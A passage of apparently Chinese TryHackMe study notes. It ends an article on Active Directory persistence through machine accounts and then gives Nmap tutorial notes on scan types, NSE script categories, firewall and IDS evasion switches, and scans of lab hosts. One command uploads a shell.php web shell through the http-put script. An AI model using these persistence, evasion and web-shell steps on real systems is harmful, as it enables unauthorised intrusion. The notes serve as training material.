Accounts：机器(计算机)帐户的密码通常会每30天轮换一次，但是，我们可以更改机器帐户的密码设置，让它停止自动轮换；除此之外，我们还可以授予机器帐户对于其他域内主机的管理及访问权限，这将允许我们将计算机帐户作为域内的其他AD帐户使用，我们只需要尝试让该帐户对其他主机也具有管理权限即可，而且这在AD域中通常是正常的行为，因此相关操作可能不会被蓝队认为是恶意行为。 我们还应该注意到，本文的重点是AD域中的权限维持技术，而本地权限维持技术仅允许攻击者在目标主机上实现权限持久化，但是如果这些目标主机是在目标AD域内的，那么我们也可以通过本地权限维持来实现针对目标AD域的权限维持。 缓解域权限维持威胁的措施 蓝队应该如何防御这些针对AD域的权限维持技术呢？在某些情况下，攻击者所执行的权限维持设置可能根深蒂固，以至于蓝队需要重新构建完整的域才能够完全清理权限维持设置；在通常情况下，蓝队可以通过以下操作来检测由攻击者所部署的权限维持设置： 检测异常帐户的登录事件，当AD域的分层模型被用户凭据所破坏时，则可能是攻击者使用了域权限维持技术的结果。 对于上文所提到的每一种域权限维持技术，蓝队都可以编写特定的检测规则，例如蓝队可以检测机器帐户的密码更改、被允许更新的ACL、是否创建了新的GPO等。 用于对抗域权限维持的最佳方法是保护特权资源，尽管攻击者可以使用低特权访问权限来部署域权限维持设置，但是真正可怕的域权限维持技术只有在攻击者获得针对目标AD域的高级访问特权后才可以被使用。 本文只是一个简单的技术介绍，关于AD域的安全性，我们还有很多地方需要学习。","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Nmap","path":"/2024/02/16/thm-nmap/","content":"0x01 简介 对于黑客来说，知识就是力量。您对目标系统或网络的了解越多，可用的选项就越多。这使得在进行任何利用尝试之前必须进行适当的枚举。 假设我们已获得一个 IP（或多个 IP 地址）来执行安全审核。在我们做任何其他事情之前，我们需要了解我们正在攻击的“景观”。这意味着我们需要确定目标上正在运行哪些服务。 例如，也许其中一个正在运行 Web 服务器，另一个则充当 Windows Active Directory 域控制器。建立景观“地图”的第一个阶段是所谓的端口扫描。当计算机运行网络服务时，它会打开一个称为“端口”的网络结构来接收连接。端口对于发出多个网络请求或提供多个可用服务是必需的。 例如，当您在网络浏览器中同时加载多个网页时，程序必须有某种方法来确定哪个选项卡正在加载哪个网页。这是通过使用本地计算机上的不同端口建立与远程网络服务器的连接来完成的。同样，如果您希望一台服务器能够运行多个服务（例如，您可能希望您的 Web 服务器同时运行该站点的 HTTP 和 HTTPS 版本），那么您需要某种方法将流量引导至适当的服务。端口再次是解决这个问题的方法。网络连接是在两个端口之间建立的 - 一个在服务器上侦听的开放端口和一个在您自己的计算机上随机选择的端口。例如，当您连接到网页时，您的计算机可能会打开端口 49534 以连接到服务器的端口 443。 与前面的示例一样，该图显示了当您同时连接到多个网站时会发生什么情况。您的计算机打开一个不同的高编号端口（随机），用于与远程服务器的所有通信。 每台计算机共有65535个可用端口；然而，其中许多已注册为标准端口。例如，HTTP Web 服务几乎总是可以在服务器的端口 80 上找到。 HTTPS Web 服务可以在端口 443 上找到。Windows NETBIOS 可以在端口 139 上找到，SMB 可以在端口 445 上找到。需要注意的是；然而，特别是在 CTF 设置中，即使这些标准端口被更改也并非闻所未闻，这使得我们更有必要对目标执行适当的枚举。 如果我们不知道服务器打开了哪些端口，那么我们就没有成功攻击目标的希望；因此，我们从端口扫描开始任何攻击至关重要。这可以通过多种方式来完成——通常使用名为 nmap 的工具，这是本​​次会议的重点。 Nmap 可用于执行许多不同类型的端口扫描 - 其中最常见的将在接下来的任务中介绍；然而，基本理论是这样的：nmap 将依次连接到目标的每个端口。根据端口的响应方式，可以将其确定为开放、关闭或过滤（通常由防火墙）。一旦我们知道哪些端口是开放的，我们就可以查看每个端口上正在运行的服务——手动，或者更常见的是使用 nmap。 那么，为什么是 nmap？简而言之，它目前成为行业标准是有原因的：没有其他端口扫描工具能够接近其功能（尽管一些新来者现在在速度上与它相匹配）。它是一个非常强大的工具 - 其脚本引擎使其更加强大，可用于扫描漏洞，在某些情况下甚至可以直接执行漏洞利用！再次，这将在接下来的任务中更多地涉及。 现在，了解以下内容很重要：什么是端口扫描；为什么有必要； nmap 是任何类型初始枚举的首选工具。 0x02 Nmap选项 与大多数渗透测试工具一样，nmap 是从终端运行的。有适用于 Windows 和 Linux 的版本。对于这个房间，我们假设您使用的是 Linux；但是，开关应该是相同的。 Nmap 默认安装在 Kali Linux 和 TryHackMe Attack Box 中。 可以通过在终端命令行中输入 nmap 来访问 Nmap，然后输入我们将在下面介绍的一些“开关”（告诉程序执行不同操作的命令参数）。 为此，您所需要的只是 nmap 的帮助菜单（使用 nmap -h 访问）和/或 nmap 手册页（使用 man nmap 访问）。对于每个答案，除非另有说明，否则请包括开关的所有部分。这包括开头的连字符 ( - )。 0x03 扫描类型概述 使用Nmap进行端口扫描时，有三种基本扫描类型。这些都是： TCP 连接扫描 ( -sT ) SYN“半开”扫描 ( -sS ) UDP 扫描 ( -sU ) 此外，还有几种不太常见的端口扫描类型，我们还将介绍其中一些类型（尽管不太详细）。这些都是： TCP 空扫描 ( -sN ) TCP FIN 扫描 ( -sF ) TCP 圣诞节扫描 ( -sX ) 其中大多数（UDP 扫描除外）的用途非常相似，但是每次扫描的工作方式有所不同。这意味着，虽然在大多数情况下您可能会选择前三种扫描之一，但值得注意的是还存在其他扫描类型。 在网络扫描方面，我们还将简要介绍一下 ICMP（或“ping”）扫描。 0x04 TCP 扫描 要了解 TCP 连接扫描 ( -sT )，熟悉 TCP 三向握手非常重要。如果您对这个术语比较陌生，那么建议您先完成网络介绍，然后再继续。 简要回顾一下，三向握手由三个阶段组成。首先，连接终端（在本例中是我们的攻击机器）向目标服务器发送一个设置了 SYN 标志的 TCP 请求。然后，服务器使用包含 SYN 标志以及 ACK 标志的 TCP 响应来确认该数据包。最后，我们的终端通过发送设置了 ACK 标志的 TCP 请求来完成握手。 这是 TCP/IP 网络的基本原则之一，但它与 Nmap 有何关系？ 顾名思义，TCP Connect 扫描的工作原理是依次与每个目标端口执行三向握手。换句话说，Nmap 尝试连接到每个指定的 TCP 端口，并通过收到的响应来确定服务是否打开。 例如，如果端口关闭，RFC 9293 指出： “…如果连接不存在（关闭），则将发送重置以响应除另一个重置之外的任何传入分段。通过这种方式拒绝与现有连接不匹配的 SYN 分段。” 换句话说，如果Nmap向关闭的端口发送设置了SYN标志的TCP请求，目标服务器将使用设置了RST（重置）标志的TCP数据包进行响应。通过此响应，Nmap 可以确定端口已关闭。 但是，如果请求发送到开放端口，目标将使用设置了 SYN/ACK 标志的 TCP 数据包进行响应。然后，Nmap 将此端口标记为打开（并通过发回设置了 ACK 的 TCP 数据包来完成握手）。 这一切都很好，但是，还有第三种可能性。 如果端口是开放的，但隐藏在防火墙后面怎么办？ 许多防火墙配置为简单地丢弃传入数据包。 Nmap 发送 TCP SYN 请求，但没有收到任何回复。这表明该端口受到防火墙保护，因此该端口被视为被过滤。 也就是说，配置防火墙以响应 RST TCP 数据包非常容易。例如，在 Linux 的 IPtables 中，命令的简单版本如下： iptables -I INPUT -p tcp --dport &lt;port&gt; -j REJECT --reject-with tcp-reset 这使得获得目标的准确读数变得极其困难（如果不是不可能的话）。 0x05 SYN 扫描 与 TCP 扫描一样，SYN 扫描 ( -sS ) 用于扫描一个或多个目标的 TCP 端口范围；然而，这两种扫描类型的工作方式略有不同。 SYN 扫描有时称为“半开放”扫描或“隐形”扫描。 TCP 扫描与目标执行完整的三向握手，SYN 扫描在从服务器接收到 SYN/ACK 后发回 RST TCP 数据包（这可以防止服务器重复尝试发出请求）。换句话说，扫描开放端口的顺序如下所示： 这对于我们黑客来说有很多好处： 它可用于绕过旧的入侵检测系统，因为它们正在寻找完整的三向握手。现代 IDS 解决方案通常不再出现这种情况；正是由于这个原因，SYN 扫描仍然经常被称为“隐形”扫描。 侦听开放端口的应用程序通常不会记录 SYN 扫描，因为标准做法是在完全建立连接后记录连接。这再次体现了 SYN 扫描的隐秘性。 无需费心为每个端口完成（和断开连接）三向握手，SYN 扫描比标准 TCP 连接扫描要快得多。 然而，SYN 扫描有一些缺点，即： 它们需要 sudo 权限 [1] 才能在 Linux 中正常工作。这是因为 SYN 扫描需要能够创建原始数据包（而不是完整的 TCP 握手），默认情况下只有 root 用户才拥有此权限。 不稳定的服务有时会因 SYN 扫描而中断，如果客户端提供了用于测试的生产环境，这可能会出现问题。 总而言之，利大于弊。 因此，如果使用 sudo 权限运行，SYN 扫描是 Nmap 使用的默认扫描。如果在没有 sudo 权限的情况下运行，Nmap 默认进行我们在上一个任务中看到的 TCP 连接扫描。 当使用 SYN 扫描来识别关闭和过滤的端口时，适用与 TCP 连接扫描完全相同的规则。 如果端口关闭，则服务器会使用 RST TCP 数据包进行响应。如果端口被防火墙过滤，则 TCP SYN 数据包将被丢弃，或者通过 TCP 重置进行欺骗。 在这方面，两次扫描是相同的：最大的区别在于它们处理开放端口的方式。 [1] 还可以通过为 Nmap 提供 CAP_NET_RAW、CAP_NET_ADMIN 和 CAP_NET_BIND_SERVICE 功能来使 SYN 扫描发挥作用；但是，这可能无法让许多 NSE 脚本正常运行。 0x06 UDP 扫描 与 TCP 不同，UDP 连接是无状态的。这意味着，UDP 连接不是通过来回“握手”来启动连接，而是依赖于将数据包发送到目标端口，并本质上希望它们能够成功。这使得 UDP 非常适合依赖速度而不是质量的连接（例如视频共享），但缺乏确认使得 UDP 扫描变得更加困难（并且速度慢得多）。 Nmap UDP 扫描的开关是 ( -sU ) 当数据包发送到开放的 UDP 端口时，不应有响应。发生这种情况时，Nmap 将端口称为 open|filtered 。换句话说，它怀疑端口是开放的，但可能被防火墙阻止。如果它收到 UDP 响应（这是非常不寻常的），则该端口被标记为打开。更常见的是没有响应，在这种情况下，会再次发送请求以进行双重检查。如果仍然没有响应，则端口被标记为打开|已过滤并且 Nmap 继续前进。 当数据包发送到关闭的 UDP 端口时，目标应使用 ICMP (ping) 数据包进行响应，其中包含该端口无法访问的消息。这清楚地识别了关闭的端口，Nmap 将其标记为关闭的端口并继续前进。 由于难以识别 UDP 端口是否实际打开，因此与各种 TCP 扫描相比，UDP 扫描往往非常慢（在连接良好的情况下扫描前 1000 个端口大约需要 20 分钟）。因此，在启用 --top-ports &lt;number&gt; 的情况下运行 Nmap 扫描通常是一个好习惯。例如，使用 nmap -sU --top-ports 20 &lt;target&gt; 进行扫描。将扫描前 20 个最常用的 UDP 端口，从而获得更可接受的扫描时间。 当扫描 UDP 端口时，Nmap 通常发送完全空的请求——只是原始的 UDP 数据包。也就是说，对于通常被知名服务占用的端口，它将发送特定于协议的有效负载，该有效负载更有可能引发响应，从而得出更准确的结果。 0x07 NULL、FIN、Xmas扫描 NULL、FIN 和 Xmas TCP 端口扫描比我们已经介绍过的其他端口扫描不太常用，因此我们不会在这里深入讨论。这三者都是相互关联的，之所以使用，主要是因为相对而言，它们比 SYN“隐形”扫描更加隐蔽。从 NULL 扫描开始： 顾名思义，NULL 扫描 ( -sN ) 是指发送 TCP 请求时根本没有设置任何标志。根据 RFC，如果端口关闭，目标主机应使用 RST 进行响应。 FIN 扫描 ( -sF ) 的工作方式几乎相同；但是，不是发送完全空的数据包，而是发送带有 FIN 标志的请求（通常用于正常关闭活动连接）。如果端口关闭，Nmap 再次期望 RST。 与此类中的其他两个扫描一样，Xmas 扫描 ( -sX ) 发送格式错误的 TCP 数据包，并期望关闭端口的 RST 响应。它被称为圣诞扫描，因为当在 Wireshark 中将其视为数据包捕获时，它设置的标志（PSH、URG 和 FIN）使其看起来像一棵闪烁的圣诞树。 这些扫描对开放端口的预期响应也是相同的，并且与 UDP 扫描的响应非常相似。如果端口打开，则不会对格式错误的数据包做出响应。不幸的是（与开放的 UDP 端口一样），如果端口受防火墙保护，这也是预期的行为，因此 NULL、FIN 和 Xmas 扫描将仅将端口识别为开放|过滤、关闭或过滤。如果某个端口被这些扫描之一识别为已过滤，则通常是因为目标已响应 ICMP 无法到达的数据包。 还值得注意的是，虽然 RFC 793 要求网络主机对关闭端口使用 RST TCP 数据包响应格式错误的数据包，而对开放端口根本不响应；实际情况并非总是如此。特别是，众所周知，Microsoft Windows（以及许多 Cisco 网络设备）会使用 RST 响应任何格式错误的 TCP 数据包 - 无论端口是否实际打开。这会导致所有端口显示为关闭。 也就是说，这里的目标当然是绕过防火墙。许多防火墙配置为将传入的 TCP 数据包丢弃到设置了 SYN 标志的阻止端口（从而阻止新的连接发起请求）。通过发送不包含 SYN 标志的请求，我们可以有效地绕过这种防火墙。虽然这在理论上很好，但大多数现代 IDS 解决方案都熟悉这些扫描类型，因此在处理现代系统时不要依赖它们 100% 有效。 0x08 ICMP 扫描 在黑盒分配中首次连接到目标网络时，我们的第一个目标是获取网络结构的“地图”，或者换句话说，我们希望查看哪些 IP 地址包含活动主机，哪些不包含活动主机。 实现此目的的一种方法是使用 Nmap 执行所谓的“ping 扫描”。顾名思义，Nmap 向指定网络的每个可能的 IP 地址发送 ICMP 数据包。当它收到响应时，它将响应的 IP 地址标记为活动的。由于我们将在后面的任务中看到的原因，这并不总是准确的；然而，它可以提供一些基线，因此值得讨论。 为了执行 ping 扫描，我们将 -sn 开关与 IP 范围结合使用，可以使用连字符 ( - ) 或 CIDR 表示法指定 IP 范围。即我们可以使用以下命令扫描 192.168.0.x 网络： nmap -sn 192.168.0.1-254or nmap -sn 192.168.0.0/24 -sn 开关告诉 Nmap 不要扫描任何端口——强制它主要依靠 ICMP 回显数据包（或本地网络上的 ARP 请求，如果使用 sudo 运行或直接以 root 用户身份运行）来识别目标。除了 ICMP 回显请求之外， -sn 开关还会导致 nmap 向目标的端口 443 发送 TCP SYN 数据包以及 TCP ACK（如果不以 root 身份运行，则发送 TCP SYN）数据包发送至目标的 80 端口。 这里图上去掉+符号 0x09 NSE 脚本概述 Nmap 脚本引擎 (NSE) 是 Nmap 的一个非常强大的补充，相当大地扩展了它的功能。 NSE 脚本是用 Lua 编程语言编写的，可用于执行多种操作：从扫描漏洞到自动利用漏洞。 NSE 对于侦察特别有用，但是，值得注意的是脚本库的范围有多大。 有很多类别可供选择。一些有用的类别包括： safe :- 不会影响目标 intrusive ：- 不安全：可能影响目标 vuln ：- 扫描漏洞 exploit ：- 尝试利用漏洞 auth ：- 尝试绕过正在运行的服务的身份验证（例如匿名登录 FTP 服务器） brute ：- 尝试暴力破解正在运行的服务的凭据 discovery ：- 尝试查询正在运行的服务以获取有关网络的更多信息（例如查询 SNMP 服务器）。 可以在此处找到更详尽的列表：here 在下一个任务中，我们将了解如何与 NSE 交互并使用这些类别中的脚本。 0x10 使用 NSE 脚本 在任务 3 中，我们非常简要地了解了使用 --script=vuln 从 vuln 类别激活 NSE 脚本的 --script 开关。其他类别的工作方式完全相同也就不足为奇了。如果运行命令 --script=safe ，则将针对目标运行任何适用的安全脚本（注意：仅激活针对活动服务的脚本）。 要运行特定脚本，我们将使用 --script=&lt;script-name&gt; ，例如 --script=http-fileupload-exploiter 。 通过用逗号分隔多个脚本可以以这种方式同时运行。例如： --script=smb-enum-users,smb-enum-shares 。 某些脚本需要参数（例如，凭据，如果它们正在利用经过身份验证的漏洞）。这些可以通过 --script-args Nmap 开关给出。一个例子是 http-put 脚本（用于使用 PUT 方法上传文件）。这需要两个参数：将文件上传到的 URL 以及文件在磁盘上的位置。例如： nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' 请注意，参数以逗号分隔，并用句点连接到相应的脚本（即 &lt;script-name&gt;.&lt;argument&gt; ）。 可以在此处找到脚本及其相应参数（以及示例用例）的完整列表：here Nmap 脚本带有内置帮助菜单，可以使用 nmap --script-help &lt;script-name&gt; 访问。这往往不像上面给出的链接那么广泛，但是，在本地工作时它仍然很有用。 0x11 NSE 搜索脚本 好的，我们知道了如何使用 Nmap 中的脚本，但我们还不知道如何找到这些脚本。 为此，我们有两种选择，最好将它们结合使用。第一个是 Nmap 网站上的页面（在上一个任务中提到），其中包含所有官方脚本的列表。第二个是攻击机器上的本地存储。 Nmap 将其脚本存储在 Linux 上的 /usr/share/nmap/scripts 处。默认情况下，所有 NSE 脚本都存储在该目录中——当您指定脚本时，Nmap 会在该目录中查找脚本。 有两种方法可以搜索已安装的脚本。一种是使用 /usr/share/nmap/scripts/script.db 文件。尽管有扩展名，但这实际上并不是一个数据库，而是一个包含每个可用脚本的文件名和类别的格式化文本文件。 Nmap 使用此文件来跟踪（并利用）脚本引擎的脚本；但是，我们也可以通过 grep 来查找脚本。例如： grep \"ftp\" /usr/share/nmap/scripts/script.db 。 搜索脚本的第二种方法非常简单，使用 ls 命令。例如，我们可以使用 ls -l /usr/share/nmap/scripts/*ftp* 获得与上一个屏幕截图相同的结果： 请注意搜索词两侧使用星号 ( * )相同的技术也可用于搜索脚本类别。例如： grep \"safe\" /usr/share/nmap/scripts/script.db 我们之前提到过，Nmap 网站包含一系列脚本，那么，如果本地 scripts 目录中缺少其中一个脚本，会发生什么情况？标准 sudo apt update &amp;&amp; sudo apt install nmap 应该可以解决这个问题；但是，也可以通过从 Nmap ( sudo wget -O /usr/share/nmap/scripts/&lt;script-name&gt;.nse https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse ) 下载脚本来手动安装脚本。然后必须跟随着 nmap --script-updatedb ，它更新 script.db 文件以包含新下载的脚本。 值得注意的是，如果您要制作自己的 NSE 脚本并将其添加到 Nmap 中，则需要相同的“updatedb”命令——这是一项非常易于管理的任务，只需具备一些 Lua 基础知识即可！ 第二问题问的是依赖： 0x12 防火墙规避 我们已经看到了一些绕过防火墙的技术（想想隐形扫描，以及 NULL、FIN 和 Xmas 扫描）；然而，还有另一种非常常见的防火墙配置，我们必须知道如何绕过它。 您的典型 Windows 主机将使用其默认防火墙阻止所有 ICMP 数据包。这就带来了一个问题：我们不仅经常使用 ping 来手动建立目标的活动，Nmap 默认情况下也会做同样的事情。这意味着 Nmap 会将具有此防火墙配置的主机注册为死亡主机，并且根本不扫描它。 因此，我们需要一种方法来绕过这个配置。幸运的是，Nmap 为此提供了一个选项： -Pn ，它告诉 Nmap 在扫描主机之前不必费心 ping 主机。这意味着 Nmap 将始终将目标主机视为活动的，从而有效地绕过 ICMP 块；然而，它的代价是可能需要很长时间才能完成扫描（如果主机确实死了，那么 Nmap 仍然会检查并仔细检查每个指定的端口）。 值得注意的是，如果您已经直接位于本地网络上，Nmap 还可以使用 ARP 请求来确定主机活动。 Nmap 认为还有多种其他开关可用于规避防火墙。我们不会详细介绍这些内容，但是可以在这里找到它们：here 以下开关尤其值得注意： -f ：- 用于对数据包进行分段（即将它们分成更小的部分），从而降低防火墙或 IDS 检测到数据包的可能性。 -f 的替代方案，但提供对数据包大小的更多控制： --mtu &lt;number&gt; ，接受用于发送的数据包的最大传输单元大小。这必须是 8 的倍数。 --scan-delay &lt;time&gt;ms ：- 用于在发送的数据包之间添加延迟。如果网络不稳定，这非常有用，而且还可以逃避任何可能存在的基于时间的防火墙/IDS 触发器。 --badsum ：- 这用于生成数据包的无效校验和。任何真正的 TCP/IP 堆栈都会丢弃此数据包，但是，防火墙可能会自动响应，而无需检查数据包的校验和。因此，该开关可用于确定防火墙/IDS 的存在。 0x13 实践 采用直接ping目标机或者nmap 的-PE选项确定ping请求 nmap -sX -p 1-999 -Pn 10.10.162.155 -vv 这里说999个端口都是被过滤的 nmap -sS -p 1-5000 -Pn 10.10.162.155 -vv nmap -Pn --script=ftp-anon -p 21 10.10.162.155 -vv 可以看到允许登录21端口 0x14 参考文章 Nmap Room Tryhackme Walkthrough 0x15 Nmap 后端口扫描 这里就当做nmap命令的笔记吧 本房间是 Nmap 系列的最后一个（网络安全简介模块的一部分）。在这个房间中，我们重点关注端口扫描之后的步骤：特别是服务检测、操作系统检测、Nmap 脚本引擎和保存扫描结果。 服务检测 一旦 Nmap 发现开放端口，您就可以探测可用端口来检测正在运行的服务。对开放端口的进一步调查是重要的信息，因为渗透测试人员可以使用它来了解该服务是否存在任何已知的漏洞。加入漏洞 101 了解有关搜索易受攻击服务的更多信息。 将 -sV 添加到 Nmap 命令将收集并确定开放端口的服务和版本信息。您可以使用 --version-intensity LEVEL 控制强度，其中级别范围为 0（最轻）和 9（最完整）。 -sV --version-light 的强度为 2，而 -sV --version-all 的强度为 9。 需要注意的是，使用 -sV 将强制 Nmap 继续进行 TCP 3 次握手并建立连接。连接建立是必要的，因为如果不完全建立连接并与监听服务通信，Nmap 就无法发现版本。换句话说，当选择 -sV 选项时，秘密SYN扫描 -sS 是不可能的。 下面的控制台输出显示了带有 -sV 选项的简单 Nmap 隐形 SYN 扫描。添加 -sV 选项会导致输出中出现一个新列，显示每个检测到的服务的版本。例如，在 TCP 端口 22 打开的情况下，我们获取的不是 22/tcp open ssh ，而是 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) 。请注意，SSH 协议被猜测为服务，因为 TCP 端口 22 已打开； Nmap 不需要连接到端口 22 来确认。但是， -sV 需要连接到此开放端口以获取服务横幅及其可以获得的任何版本信息，例如 nginx 1.6.2 。因此，与服务列不同，版本列不是猜测。 请注意，许多 Nmap 选项需要 root 权限。除非您以 root 身份运行 Nmap，否则您需要使用 sudo 。 操作系统检测和Traceroute 操作系统检测 Nmap 可以根据操作系统 (OS) 的行为及其响应中的任何迹象来检测操作系统 (OS)。可以使用 -O 启用操作系统检测；这是 OS 中的大写 O。在此示例中，我们在 AttackBox 上运行 nmap -sS -O 10.10.212.228 。 Nmap检测到操作系统是Linux 3.X，然后进一步猜测它运行的是内核3.13。 pentester@TryHackMe$ sudo nmap -sS -O 10.10.212.228 Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:04 BST Nmap scan report for 10.10.212.228 Host is up (0.00099s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap MAC Address: 02:A0:E7:B5:B6:C5 (Unknown) Device type: general purpose Running: Linux 3.X OS CPE: cpe:/o:linux:linux_kernel:3.13 OS details: Linux 3.13 Network Distance: 1 hop OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 3.91 seconds 我们扫描并尝试检测其操作系统版本的系统正在运行内核版本 3.16。 Nmap 能够在这种情况下做出接近的猜测。在另一个案例中，我们扫描了内核为5.13.14的Fedora Linux系统；然而，Nmap 检测到它是 Linux 2.6.X。好消息是 Nmap 正确检测到操作系统；不太好的消息是内核版本错误。 操作系统检测非常方便，但许多因素可能会影响其准确性。首先，Nmap需要在目标上找到至少一个开放端口和一个关闭端口才能进行可靠的猜测。此外，由于虚拟化和类似技术的广泛使用，客户操作系统的指纹可能会变得扭曲。因此，在使用操作系统版本信息时，要持有怀疑态度。 路由追踪 如果你想让 Nmap 找到你和目标之间的路由器，只需添加 --traceroute 。在以下示例中，Nmap 将跟踪路由附加到其扫描结果中。请注意，Nmap 的跟踪路由的工作方式与 Linux 和 macOS 上的 traceroute 命令或 MS Windows 上的 tracert 命令略有不同。标准 traceroute 以低 TTL（生存时间）数据包开始，并不断增加直至到达目标。 Nmap 的跟踪路由从高 TTL 的数据包开始，并不断减少它。 在下面的示例中，我们在 AttackBox 上执行了 nmap -sS --traceroute 10.10.212.228 。我们可以看到两者之间没有路由器/跃点，因为它们是直接连接的。 pentester@TryHackMe$ sudo nmap -sS --traceroute 10.10.212.228 Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:05 BST Nmap scan report for 10.10.212.228 Host is up (0.0015s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap MAC Address: 02:A0:E7:B5:B6:C5 (Unknown) TRACEROUTE HOP RTT ADDRESS 1 1.48 ms MACHINE_IP Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds 值得一提的是，许多路由器都配置为不发送超出生存时间的 ICMP，这会阻止我们发现它们的 IP 地址。欲了解更多信息，请访问主动侦察室。 nmap -sS -O 10.10.212.228 Nmap 脚本 NSE 脚本是一段不需要编译的代码。换句话说，它保持原来的人类可读形式，不需要转换为机器语言。许多程序通过脚本提供附加功能；此外，脚本可以添加通过内置命令不存在的自定义功能。同样，Nmap 也提供对使用 Lua 语言的脚本的支持。 Nmap 脚本引擎（NSE）是 Nmap 的一部分，是一个 Lua 解释器，允许 Nmap 执行用 Lua 语言编写的 Nmap 脚本。然而，我们不需要学习 Lua 来使用 Nmap 脚本。 您的 Nmap 默认安装可以轻松包含近 600 个脚本。查看 Nmap 安装文件夹。在 AttackBox 上，检查 /usr/share/nmap/scripts 处的文件，您会注意到有数百个脚本，以它们的目标协议开头，方便命名。我们在下面的控制台输出中列出了 AttackBox 上以 HTTP 开头的所有脚本；我们发现了大约 130 个以 http 开头的脚本。随着未来的更新，您只能期望安装的脚本数量会增加。 您可以指定使用这些已安装脚本中的任何一个或一组；此外，您可以安装其他用户的脚本并将其用于扫描。让我们从默认脚本开始。您可以选择使用 --script=default 或简单地添加 -sC 来运行默认类别中的脚本。除了默认之外，类别还包括身份验证、广播、暴力、默认、发现、dos、漏洞利用、外部、模糊器、侵入、恶意软件、安全、版本和漏洞。简要说明如下表所示。 Script Category Description auth 认证相关脚本 broadcast 通过发送广播消息发现主机 brute 对登录执行暴力密码审核 default 默认脚本，与 -sC 相同 discovery 检索可访问的信息，例如数据库表和 DNS 名称 dos 检测易受拒绝服务 (DoS) 攻击的服务器 exploit 尝试利用各种易受攻击的服务 external 使用第三方服务进行检查，例如 Geoplugin 和 Virustotal fuzzer 发起模糊攻击 intrusive 暴力攻击和利用等侵入性脚本 malware 扫描后门 safe 不会使目标崩溃的安全脚本 version 检索服务版本 vuln 检查漏洞或利用易受攻击的服务 有些脚本属于多个类别。此外，一些脚本对服务发起暴力攻击，而另一些脚本则发起 DoS 攻击并利用系统。因此，如果您不想使服务崩溃或利用它们，那么在选择要运行的脚本时要小心，这一点至关重要。 我们使用 Nmap 对 10.10.104.195 运行 SYN 扫描，并在控制台中执行默认脚本，如下所示。该命令是 sudo nmap -sS -sC 10.10.104.195 ，其中 -sC 将确保 Nmap 在 SYN 扫描之后执行默认脚本。下面出现了新的详细信息。查看22端口的SSH服务； Nmap 恢复了与正在运行的服务器相关的所有四个公钥。考虑另一个例子，端口 80 上的 HTTP 服务； Nmap 检索默认页面标题。我们可以看到该页面已保留为默认页面。 pentester@TryHackMe$ sudo nmap -sS -sC 10.10.104.195 Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:08 BST Nmap scan report for ip-10-10-161-170.eu-west-1.compute.internal (10.10.161.170) Host is up (0.0011s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 1024 d5:80:97:a3:a8:3b:57:78:2f:0a:78:ae:ad:34:24:f4 (DSA) | 2048 aa:66:7a:45:eb:d1:8c:00:e3:12:31:d8:76:8e:ed:3a (RSA) | 256 3d:82:72:a3:07:49:2e:cb:d9:87:db:08:c6:90:56:65 (ECDSA) |_ 256 dc:f0:0c:89:70:87:65:ba:52:b1:e9:59:f7:5d:d2:6a (EdDSA) 25/tcp open smtp |_smtp-commands: debra2.thm.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | ssl-cert: Subject: commonName=debra2.thm.local | Not valid before: 2021-08-10T12:10:58 |_Not valid after: 2031-08-08T12:10:58 |_ssl-date: TLS randomness does not represent time 80/tcp open http |_http-title: Welcome to nginx on Debian! 110/tcp open pop3 |_pop3-capabilities: RESP-CODES CAPA TOP SASL UIDL PIPELINING AUTH-RESP-CODE 111/tcp open rpcbind | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 38099/tcp status |_ 100024 1 54067/udp status 143/tcp open imap |_imap-capabilities: LITERAL+ capabilities IMAP4rev1 OK Pre-login ENABLE have LOGINDISABLEDA0001 listed SASL-IR ID more post-login LOGIN-REFERRALS IDLE MAC Address: 02:A0:E7:B5:B6:C5 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds 您还可以使用 --script \"SCRIPT-NAME\" 或 --script \"ftp*\" 等模式按名称指定脚本，其中包括 ftp-brute 。如果您不确定脚本的作用，可以使用文本阅读器（例如 less ）或文本编辑器打开脚本文件。对于 ftp-brute ，它指出：“对 FTP 服务器执行暴力密码审核。”您必须小心，因为某些脚本非常具有侵入性。此外，某些脚本可能适用于特定服务器，如果随机选择，则会浪费您的时间而没有任何好处。与往常一样，请确保您有权在目标服务器上启动此类测试。 让我们考虑一个良性脚本 http-date ，我们猜测它会检索 http 服务器日期和时间，这在其描述中确实得到了证实：“从类似 HTTP 的服务获取日期。此外，它还会打印日期与当地时间的差异……”在 AttackBox 上，我们执行 sudo nmap -sS -n --script \"http-date\" 10.10.104.195 ，如下面的控制台所示。 pentester@TryHackMe$ sudo nmap -sS -n --script \"http-date\" 10.10.104.195 Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 08:04 BST Nmap scan report for 10.10.104.195 Host is up (0.0011s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http |_http-date: Fri, 10 Sep 2021 07:04:26 GMT; 0s from local time. 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap MAC Address: 02:44:87:82:AC:83 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds 最后，您可以将 Nmap 的功能扩展到官方 Nmap 脚本之外；您可以编写脚本或从 Internet 下载 Nmap 脚本。从 Internet 下载和使用 Nmap 脚本存在一定程度的风险。因此，最好不要运行您不信任的作者的脚本。 知道 Nmap 脚本保存在 AttackBox 